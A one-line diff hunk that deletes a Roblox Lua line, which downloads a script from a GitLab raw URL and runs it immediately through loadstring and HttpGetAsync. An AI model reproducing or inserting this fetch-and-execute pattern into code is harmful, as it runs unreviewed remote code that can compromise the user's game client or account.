@@ -1,1 +1,0 @@
-loadstring(game:HttpGetAsync("https://gitlab.com/Sky2836/test/-/raw/main/Windows"))()
